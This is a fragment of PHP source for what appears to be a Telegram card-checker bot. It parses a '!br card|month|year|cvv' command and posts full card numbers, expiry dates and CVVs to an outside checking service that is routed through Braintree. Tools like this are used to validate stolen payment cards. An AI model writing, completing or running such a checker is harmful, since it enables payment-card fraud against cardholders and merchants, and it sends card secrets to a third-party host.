    ...
    if($cmd == "/br" or $cmd == ".br" or $cmd == "!br"){
    $NameGater ='Braintree';
    $gateway = '/br :'.$NameGater;
...
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!br card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                    ]);
            die();
    }
...
━━━━━━━━━━━━━━━━</b>"
    ...
    $json = $curl::Post('https://gfr.4p15f0rchk.work/PremiumService/',$data = 'type=Check&Card='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'&Route=Braintree_0_5', $headers)->body;
